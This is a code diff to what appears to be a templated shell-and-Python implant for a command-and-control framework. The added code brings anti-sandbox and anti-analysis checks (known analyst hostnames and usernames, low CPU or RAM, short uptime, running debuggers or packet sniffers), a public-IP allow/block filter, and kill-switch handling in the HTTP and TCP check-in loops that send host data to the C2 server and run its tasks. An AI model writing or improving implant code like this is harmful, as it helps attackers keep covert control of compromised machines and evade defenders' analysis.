@@ -5,6 +5,74 @@ BEACON_ID="{{BEACON_ID}}"
 SLEEP={{SLEEP}}
 JITTER={{JITTER}}
 PROTO="{{PROTO}}"
+ALLOWED_IPS="{{ALLOWED_IPS}}"
+BLOCKED_IPS="{{BLOCKED_IPS}}"
+
+# Sandbox detection
+check_sandbox() {
+    local hn=$(hostname 2>/dev/null | tr '[:lower:]' '[:upper:]')
+    local un=$(whoami 2>/dev/null | tr '[:upper:]' '[:lower:]')
+
+    # Exact hostname match only
+    for pat in SANDBOX CUCKOO TEQUILA REMNUX FLAREVM TPMNOTIFY; do
+        [ "$hn" = "$pat" ] && return 0
+    done
+    for pat in sandbox cuckoo remnux malnetvm maltest; do
+        [ "$un" = "$pat" ] && return 0
+    done
+
+    # CPU cores < 2 (2H minimum)
+    local cpus=$(nproc 2>/dev/null || echo 2)
+    [ "$cpus" -lt 2 ] 2>/dev/null && return 0
+
+    # RAM < 2GB (2G minimum)
+    if [ -f /proc/meminfo ]; then
+        local mem_kb=$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}')
+        [ -n "$mem_kb" ] && [ "$mem_kb" -lt 2097152 ] 2>/dev/null && return 0
+    fi
+
+    # Uptime < 30 minutes
+    if [ -f /proc/uptime ]; then
+        local uptime_sec=$(awk '{print int($1)}' /proc/uptime 2>/dev/null)
+        [ -n "$uptime_sec" ] && [ "$uptime_sec" -lt 1800 ] 2>/dev/null && return 0
+    fi
+
+    # Analysis tools in process list (no VM tools)
+    local procs=$(ps aux 2>/dev/null | tr '[:upper:]' '[:lower:]')
+    for tool in wireshark tcpdump strace ltrace gdb sysdig cuckoomon dumpcap fakenet; do
+        echo "$procs" | grep -q "$tool" && return 0
+    done
+
+    return 1
+}
+
+check_ip_filter() {
+    [ -z "$ALLOWED_IPS" ] && [ -z "$BLOCKED_IPS" ] && return 0
+    local public_ip=$(curl -s --max-time 5 http://api.ipify.org 2>/dev/null || curl -s --max-time 5 http://ifconfig.me/ip 2>/dev/null)
+    [ -z "$public_ip" ] && return 0  # fail-open
+    if [ -n "$BLOCKED_IPS" ]; then
+        IFS='|' read -ra entries <<< "$BLOCKED_IPS"
+        for entry in "${entries[@]}"; do
+            entry=$(echo "$entry" | xargs)
+            [ -z "$entry" ] && continue
+            [ "$public_ip" = "$entry" ] && return 1
+        done
+    fi
+    if [ -n "$ALLOWED_IPS" ]; then
+        IFS='|' read -ra entries <<< "$ALLOWED_IPS"
+        for entry in "${entries[@]}"; do
+            entry=$(echo "$entry" | xargs)
+            [ -z "$entry" ] && continue
+            [ "$public_ip" = "$entry" ] && return 0
+        done
+        return 1
+    fi
+    return 0
+}
+
+sleep 10
+check_sandbox && exit 0
+check_ip_filter || exit 0
 
 get_internal_ip() {
     ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d/ -f1 2>/dev/null || \
@@ -193,9 +261,11 @@ elif cmd.startswith('__DELETE__ '):
 
 http_register() {
     local json=$(get_host_json)
-    curl -s -X POST "${C2_URL}/checkin" \
+    local resp
+    resp=$(curl -s -X POST "${C2_URL}/checkin" \
         -H "Content-Type: application/json" \
-        -d "${json}" -m 10 >/dev/null 2>&1
+        -d "${json}" -m 10 2>/dev/null)
+    [ "$resp" = "__TERMINATE__" ] && exit 0
 }
 
 http_send_result() {
@@ -217,6 +287,7 @@ http_checkin() {
         "${C2_URL}/checkin?id=${BEACON_ID}" -m 10 2>/dev/null)
 
     [ -z "$response" ] && return
+    [ "$response" = "__TERMINATE__" ] && exit 0
 
     if echo "$response" | grep -q "^SLEEP "; then
         SLEEP=$(echo "$response" | awk '{print $2}')
@@ -292,12 +363,15 @@ while True:
     try:
         s = socket.create_connection((host, port), timeout=10)
         tcp_write(s, {'type':'register','data':get_host_info()})
-        tcp_read(s)
+        ack = tcp_read(s)
+        if ack.get('type') == 'terminate': s.close(); sys.exit(0)
         while True:
             sleep_j()
             tcp_write(s, {'type':'checkin'})
             resp = tcp_read(s)
-            if resp.get('type') == 'tasks':
+            if resp.get('type') == 'terminate':
+                s.close(); sys.exit(0)
+            elif resp.get('type') == 'tasks':
                 for t in resp.get('data', []):
                     if t.get('command') == '__EXIT__':
                         tcp_write(s, {'type':'result','data':{'task_id':t['id'],'output':'TERMINATED'}})
